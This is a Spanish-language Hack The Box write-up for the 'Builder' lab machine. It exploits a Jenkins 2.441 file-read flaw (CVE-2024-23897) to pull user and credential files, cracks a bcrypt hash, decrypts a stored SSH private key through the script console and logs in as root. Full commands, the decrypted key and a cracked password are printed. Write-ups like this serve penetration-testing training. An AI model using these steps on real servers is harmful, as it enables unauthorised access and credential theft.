+++
author = "Andrés Del Cerro"
title = "Hack The Box: Builder Writeup | Medium"
date = "2024-08-30"
description = ""
tags = [
    "HackTheBox",
    "Builder",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "Jenkins Enumeration",
    "Local File Inclusion",
    "Information Leakage",
    "Cracking",
    "Password Cracking",
    "Dumping Jenkins Credentials",
    "Decrypting Jenkins Credentials"
]

+++

# Hack The Box: Builder Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Builder"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.230.220 --ulimit 5000 -g
10.129.230.220 -> [22,8080]
```

```console
$ nmap -p22,8080 -sCV 10.129.230.220 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 14:34 CEST
Nmap scan report for 10.129.230.220
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.07 seconds
```
# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.230.220 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 14:36 CEST
Nmap scan report for 10.129.230.220
Host is up (0.036s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
539/udp   closed apertus-ldp
9200/udp  closed wap-wsp
16939/udp closed unknown
19096/udp closed unknown
22376/udp closed unknown
25652/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

# HTTP Enumeration
El único punto de entrada que encontramos después de la enumeración inicial es el servicio HTTP del puerto 8080/TCP.

`whatweb` nos reporta que es un Jenkins versión 2.441
```console
$ whatweb http://10.129.230.220:8080
http://10.129.230.220:8080 [200 OK] Cookies[JSESSIONID.6b7517c1], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.6b7517c1], IP[10.129.230.220], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Rápidamente encontramos que existe una vulnerabilidad de tipo Local File Inclusion en este gestor.
```console
$ searchsploit jenkins                                                                                  
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path                           
------------------------------------------------------------------------------ ---------------------------------

...

Jenkins 2.441 - Local File Inclusion                                          | java/webapps/51993.py
```

Nos podemos descargar el exploit.
```console
$ searchsploit -m java/webapps/51993.py
  Exploit: Jenkins 2.441 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/51993
     Path: /opt/exploitdb/exploits/java/webapps/51993.py
    Codes: CVE-2024-23897
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/pointedsec/Desktop/builder/exploits/51993.py
```

Antes de continuar vamos a echar un vistazo al sitio web, ya que ni siquiera lo he mirado.

Se ve como una instancia de Jenkins normal.
![Write-up Image](images/Screenshot_1.png)

Detectamos un usuario llamado `jennifer`
![Write-up Image](images/Screenshot_2.png)

También una credencial que es una clave SSH de nombre `root` pero esto no significa que sea para este usuario.
![Write-up Image](images/Screenshot_3.png)

## Local File Inclusion
Como no vemos ningún proyecto, tampoco podemos enumerar mas esta instancia de Jenkins.

Me interesa saber como funciona el LFI, así que primero vamos a probar si funciona.

```console
$ python3 lfi.py -u http://10.129.230.220:8080
Press Ctrl+C to exit
File to download:
> /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
Vemos que funciona.

Antes que ponernos a analizar el código podemos pasar todas las solicitudes que realice este script por nuestro proxy de `burpsuite`.

Para esto siempre suelo editar el código pero esta vez decidí hacerlo de otra manera.

Podemos editar el archivo de configuración de `proxychains`.

> [!Aclaración]
> `micro` es un editor de texto como `nano`.
> 

```console
$ sudo micro /etc/proxychains.conf
```

Podemos agregar a lo último del fichero el proxy de `burpsuite`.
![Write-up Image](images/Screenshot_4.png)

Y ahora si abrimos `burpsuite` e interceptamos las peticiones.

Y ejecutamos el exploit utilizando `proxychains`
```console
$ proxychains python3 lfi.py -u http://10.129.230.220:8080
ProxyChains-3.1 (http://proxychains.sf.net)
Press Ctrl+C to exit
File to download:
> /etc/passwd
|S-chain|-<>-127.0.0.1:8080-<><>-10.129.230.220:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-10.129.230.220:8080-<><>-OK
```

Vemos que interceptamos la petición.
![Write-up Image](images/Screenshot_6.png)

Si le damos a `Forward` vemos la petición donde se acontece el Local File Inclusion.

Parece que hace una petición POST a `/cli` con el query param `remoting` a false. Y en el parámetro `connect-node` es capaz de inyectar un archivo a nivel de sistema escapando con el carácter `@` .
![Write-up Image](images/Screenshot_7.png)

Ahora que ya sabemos como funciona el exploit vamos a ver que conseguimos.

Vemos que existe un usuario `jenkins` y que su directorio personal de trabajo es `/var/jenkins_home` y encima tiene una `bash`.

Esto es un poco extraño.
```console
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
```

Nos encontramos la flag de usuario en el directorio de este usuario...

```console
> /var/jenkins_home/user.txt
16f0ce2316be69a2...
```

## Foothold -> Root

Con una búsqueda en Google vemos que la credencial por defecto se almacena en `$JENKINS_HOME/secrets/initialAdminPassword` lo que sería `/var/jenkins_home/secrets/initialAdminPassword`
![Write-up Image](images/Screenshot_8.png)

Pero no encontramos ningún archivo en esta ruta.
```console
> /var/jenkins_home/secrets/initialAdminPassword
File not found.
```

Podemos intentar ver el fichero `users.xml` que es el que contiene información de los usuarios en Jenkins pero vemos que este fichero no está completo.
```console
> /var/jenkins_home/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```

Haciendo otra búsqueda en Google vemos que probablemente se incluya la contraseña de este usuario en `/var/jenkins_home/users/USUARIO/config.xml`, en este caso el usuario es `jennifer_12108429903186576833`
![Write-up Image](images/Screenshot_11.png)

Al visualizar este fichero.
```console
> /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

Vemos un hash `bcrypt` para este usuario.
![Write-up Image](images/Screenshot_12.png)

Este hash lo podemos intentar crackear con `hashcat.`
`$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`

Podemos buscar el modo, en este caso 3200.
![Write-up Image](images/Screenshot_14.png)

```console
$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```

Y conseguimos crackear este hash, la credencial de `jennifer` es `pricess`
![Write-up Image](images/Screenshot_13.png)

Podemos acceder al Jenkins como `jennifer`
![Write-up Image](images/Screenshot_15.png)

Recordemos que existía una clave para acceder por SSH.

No podemos visualizarla pero podemos editarla.
![Write-up Image](images/Screenshot_16.png)

Buscando un poco me encontré [este artículo](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) sobre como dumpear credenciales en Jenkins.

Aunque previamente encontré que las credenciales se guardan en un fichero llamado `credentials.xml`

Por lo cual a través del LFI podemos recuperar el fichero `/var/jenkins_home/credentials.xml`

Y vemos este campo `privateKey` correspondiente a la única credencial almacenada en este fichero.
```xml
<privateKey>{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}</privateKey>
```

Según el artículo previamente mencionado podemos utilizar la consola de Jenkins (necesitamos acceder como administradores a ella) y una vez allí podemos desencriptar esta clave privada.

Nos dirigimos a `http://10.129.230.220:8080/manage/script`

Ahora debemos de pegar la siguiente línea.
```console
println hudson.util.Secret.decrypt("{BASE64}")
```

![Write-up Image](images/Screenshot_17.png)

Conseguimos la clave privada.

```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

La guardamos y la damos permisos.
```console
$ micro id_rsa
$ chmod 600 id_rsa 
```


Y con esta clave privada podemos conectarnos como el usuario `root`

```console
$ ssh -i id_rsa root@10.129.230.220
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)
...
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)
root@builder:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:bc:3d brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.230.220/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3259sec preferred_lft 3259sec
    inet6 dead:beef::250:56ff:fe94:bc3d/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe94:bc3d/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:de:a0:51:65 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:deff:fea0:5165/64 scope link 
       valid_lft forever preferred_lft forever
5: vethfa2365e@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether f6:82:bd:53:7d:25 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::f482:bdff:fe53:7d25/64 scope link 
       valid_lft forever preferred_lft forever
root@builder:~# 
```

Podemos leer la flag de `root`
```console
root@builder:~# cat root.txt
c1c98181527be...
```

Happy Hacking! 🚀